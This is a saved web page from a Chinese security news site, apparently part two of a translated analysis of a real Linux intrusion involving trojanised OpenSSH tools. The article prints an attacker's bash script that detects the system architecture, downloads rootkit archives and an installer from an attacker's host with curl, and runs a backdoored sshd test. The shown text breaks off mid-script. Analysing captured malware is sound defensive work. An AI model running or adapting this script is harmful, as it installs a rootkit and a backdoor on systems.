@@ -1,0 +1,1237 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】解剖一次真正的 Linux 入侵（第二部分）︰ OpenSSH的木马病毒工具 - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="Linux攻击,root工具包,木马工具,MiTM 蜜罐"/>
+    
+        <meta name="description" content="我最近一直在研究的、十分有趣的Linux攻击和入侵。我将会分享一些我已经分析过的工具，其中包括几个木马工具、扫描工具、root工具包等。(第二部分)"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】解剖一次真正的 Linux 入侵（第二部分）︰ OpenSSH的木马病毒工具</h2>
+                <div class="article-msg">
+                    <span class="time">2016-09-26 11:07:48</span>
+                    
+                                        <span class="read">阅读：15898次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3052"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3052" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href="http://blog.angelalonso.es/2016/09/anatomy-of-real-linux-intrusion-part-ii.html"
+                             target="_blank">来源： 安全客</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=2543542076" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t011edf3404f95091e3.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=2543542076" style="color:#848e99;">默白</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="white-space: normal; text-indent: 2em; text-align: center;"><img src="http://p7.qhimg.com/t017ed644470ab8b23f.jpg" title="t0111351a1a7277b4a9.jpg" alt="http://p4.qhimg.com/t0111351a1a7277b4a9.jpg"/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-weight: 900; line-height: 25px; text-indent: 32px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; font-size: 18px; background-color: rgb(255, 255, 255);">传送门</span></p><hr/><p><span style="color: rgb(79, 129, 189);"><strong>&nbsp;&nbsp;&nbsp;&nbsp;【技术分享】解剖一次真正的 Linux 入侵（第一部分)︰运行SSH MiTM 蜜罐</strong></span> &nbsp;<a href="http://bobao.360.cn/learning/detail/3051.html" _src="http://bobao.360.cn/learning/detail/3051.html">http://bobao.360.cn/learning/detail/3051.html</a> </p><p style="white-space: normal; text-indent: 2em;"><br/></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">正如文章第一部分所说，结构和LiNUX版本的不同会导致不同文件的调用。对于树莓Pi2处理器ARMv6来说，URL是http://gopremium.mooo.com/.../auto/arm61.tgz；ARMv7对应的是一个特定软件包，其中包含mips64、 mips、&nbsp;vyos64和vyos（这是一个开源的网络操作系统）。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当然也有系统默认版本，那就是http://gopremium.mooo.com/.../auto/default.tgz</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">在文章第一部分里，我给出了一个p脚本，这里我将陆续给出其余p脚本。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><p style="white-space: normal; text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">脚本2（p1）：编译SSH的木马版本并进行测试</span></strong></p><hr style="white-space: normal;"/><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">第二个脚本负责检测系统的体系结构。根据架构和Linux版本的不同，添加一些额外的工具帮助执行。</span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"><br/></span></p><p style="white-space: normal; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">完整的脚本如下所示：</span><br/></p><pre class="brush:html;toolbar:false">#!/bin/bash
+##############&nbsp;OS&nbsp;&amp;&nbsp;RK&nbsp;detection&nbsp;(p1)
+##############&nbsp;detecteaza&nbsp;OS,&nbsp;downloadeaza&nbsp;rk&nbsp;si&nbsp;ii&nbsp;face&nbsp;test
+
+rm&nbsp;-rf&nbsp;1tempfiles&nbsp;;&nbsp;mkdir&nbsp;1tempfiles
+
+echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;trying&nbsp;to&nbsp;detect&nbsp;OS&quot;
+arch=$(uname&nbsp;-m)
+kernel=$(uname&nbsp;-r)
+if&nbsp;[&nbsp;-f&nbsp;/etc/lsb-release&nbsp;];&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os=$(lsb_release&nbsp;-s&nbsp;-d)
+elif&nbsp;[&nbsp;-f&nbsp;/etc/debian_version&nbsp;];&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os=&quot;Debian&nbsp;$(cat&nbsp;/etc/debian_version)&quot;
+elif&nbsp;[&nbsp;-f&nbsp;/etc/redhat-release&nbsp;];&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os=`cat&nbsp;/etc/redhat-release`
+else
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;os=&quot;UNKNOWN&nbsp;OS&nbsp;$(uname&nbsp;-s)&nbsp;$(uname&nbsp;-r)&nbsp;aborting.&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;;&nbsp;exit
+fi
+echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;OS&nbsp;found:&nbsp;$os&nbsp;(arch:&nbsp;$arch&nbsp;kernel:&nbsp;$kernel)&quot;
+echo&nbsp;&quot;$os&nbsp;(arch:&nbsp;$arch&nbsp;kernel:&nbsp;$kernel)&quot;&nbsp;&gt;&nbsp;1tempfiles/os.txt
+
+
+echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;trying&nbsp;to&nbsp;find&nbsp;rk&nbsp;for&nbsp;this&nbsp;OS&quot;&nbsp;#&nbsp;green
+if&nbsp;[&nbsp;&quot;$arch&quot;&nbsp;==&nbsp;&quot;armv7l&quot;&nbsp;]&nbsp;;&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rk=&quot;arm71&quot;&nbsp;;&nbsp;echo&nbsp;&quot;$rk&quot;&nbsp;&gt;&nbsp;1tempfiles/rk.txt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;...&quot;&nbsp;&gt;&nbsp;1tempfiles/side_files_dir.txt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;$rk.tgz&nbsp;found.&nbsp;downloading&nbsp;rk&nbsp;&amp;&nbsp;install&nbsp;file&nbsp;(p2)&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rm&nbsp;-rf&nbsp;$rk.tgz&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl&nbsp;--progress-bar&nbsp;-O&nbsp;http://gopremium.mooo.com/.../auto/$rk.tgz
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl&nbsp;--progress-bar&nbsp;-O&nbsp;http://gopremium.mooo.com/.../auto/p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;!&nbsp;-f&nbsp;$rk.tgz&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;file&nbsp;missing&nbsp;-&nbsp;download&nbsp;failed.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;!&nbsp;-f&nbsp;p2&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;file&nbsp;missing&nbsp;-&nbsp;download&nbsp;failed.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;starting&nbsp;rk&nbsp;test&nbsp;&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chmod&nbsp;+x&nbsp;p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tar&nbsp;mzxf&nbsp;$rk.tgz&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;$rk.tgz
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;maindir=`pwd`&nbsp;;&nbsp;rkdir=&quot;$maindir/$rk&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cd&nbsp;$rkdir&nbsp;;&nbsp;./run&nbsp;test&nbsp;$rk&nbsp;1&gt;&gt;$maindir/1tempfiles/log.rktest&nbsp;2&gt;&gt;$maindir/1tempfiles/log.rktest
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;rk&nbsp;test&nbsp;done&nbsp;(logs&nbsp;in&nbsp;$maindir/1tempfiles/log.rktest).&nbsp;please&nbsp;manually&nbsp;check:&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$rkdir/$rk/test-sshd&nbsp;-p&nbsp;65535&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;telnet&nbsp;127.0.0.1&nbsp;65535&nbsp;&nbsp;OR&nbsp;&nbsp;ssh&nbsp;root@127.0.0.1&nbsp;-p&nbsp;65535&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killall&nbsp;-9&nbsp;test-sshd&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;\033[0m\033[0m&nbsp;After&nbsp;checking,&nbsp;run&nbsp;the&nbsp;full&nbsp;install:&nbsp;./p2&nbsp;&quot;&nbsp;#cyan
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+
+elif&nbsp;[&nbsp;&quot;$arch&quot;&nbsp;==&nbsp;&quot;armv6l&quot;&nbsp;]&nbsp;;&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rk=&quot;arm61&quot;&nbsp;;&nbsp;echo&nbsp;&quot;$rk&quot;&nbsp;&gt;&nbsp;1tempfiles/rk.txt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;...&quot;&nbsp;&gt;&nbsp;1tempfiles/side_files_dir.txt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;$rk.tgz&nbsp;found.&nbsp;downloading&nbsp;rk&nbsp;&amp;&nbsp;install&nbsp;file&nbsp;(p2)&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rm&nbsp;-rf&nbsp;$rk.tgz&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl&nbsp;--progress-bar&nbsp;-O&nbsp;http://gopremium.mooo.com/.../auto/$rk.tgz
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl&nbsp;--progress-bar&nbsp;-O&nbsp;http://gopremium.mooo.com/.../auto/p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;!&nbsp;-f&nbsp;$rk.tgz&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;file&nbsp;missing&nbsp;-&nbsp;download&nbsp;failed.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;!&nbsp;-f&nbsp;p2&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;file&nbsp;missing&nbsp;-&nbsp;download&nbsp;failed.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;starting&nbsp;rk&nbsp;test&nbsp;&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;chmod&nbsp;+x&nbsp;p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tar&nbsp;mzxf&nbsp;$rk.tgz&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;$rk.tgz
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;maindir=`pwd`&nbsp;;&nbsp;rkdir=&quot;$maindir/$rk&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cd&nbsp;$rkdir&nbsp;;&nbsp;./run&nbsp;test&nbsp;$rk&nbsp;1&gt;&gt;$maindir/1tempfiles/log.rktest&nbsp;2&gt;&gt;$maindir/1tempfiles/log.rktest
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;rk&nbsp;test&nbsp;done&nbsp;(logs&nbsp;in&nbsp;$maindir/1tempfiles/log.rktest).&nbsp;please&nbsp;manually&nbsp;check:&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$rkdir/$rk/test-sshd&nbsp;-p&nbsp;65535&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;telnet&nbsp;127.0.0.1&nbsp;65535&nbsp;&nbsp;OR&nbsp;&nbsp;ssh&nbsp;root@127.0.0.1&nbsp;-p&nbsp;65535&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;killall&nbsp;-9&nbsp;test-sshd&quot;
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;36m&nbsp;[x]&nbsp;\033[0m\033[0m&nbsp;After&nbsp;checking,&nbsp;run&nbsp;the&nbsp;full&nbsp;install:&nbsp;./p2&nbsp;&quot;&nbsp;#cyan
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo
+
+elif&nbsp;[&nbsp;&quot;$arch&quot;&nbsp;==&nbsp;&quot;mips64&quot;&nbsp;]&nbsp;;&nbsp;then
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rk=&quot;edgeos64&quot;&nbsp;;&nbsp;echo&nbsp;&quot;$rk&quot;&nbsp;&gt;&nbsp;1tempfiles/rk.txt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;&quot;...&quot;&nbsp;&gt;&nbsp;1tempfiles/side_files_dir.txt
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;32m&nbsp;[+]&nbsp;\033[0m\033[0m&nbsp;$rk.tgz&nbsp;found.&nbsp;downloading&nbsp;rk&nbsp;&amp;&nbsp;install&nbsp;file&nbsp;(p2)&quot;&nbsp;#&nbsp;green
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rm&nbsp;-rf&nbsp;$rk.tgz&nbsp;;&nbsp;rm&nbsp;-rf&nbsp;p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl&nbsp;--progress-bar&nbsp;-O&nbsp;http://gopremium.mooo.com/.../auto/$rk.tgz
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;curl&nbsp;--progress-bar&nbsp;-O&nbsp;http://gopremium.mooo.com/.../auto/p2
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;!&nbsp;-f&nbsp;$rk.tgz&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;file&nbsp;missing&nbsp;-&nbsp;download&nbsp;failed.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;[&nbsp;!&nbsp;-f&nbsp;p2&nbsp;]&nbsp;;&nbsp;then&nbsp;echo&nbsp;-e&nbsp;&quot;\033[0;31m&nbsp;[-]&nbsp;\033[0m\033[0m&nbsp;file&nbsp;missing&nbsp;-&nbsp;download&nbsp;failed.&nbsp;aborting&quot;&nbsp;;&nbsp;echo&nbsp;;&nbsp;exit&nbsp;;&nbsp;fi
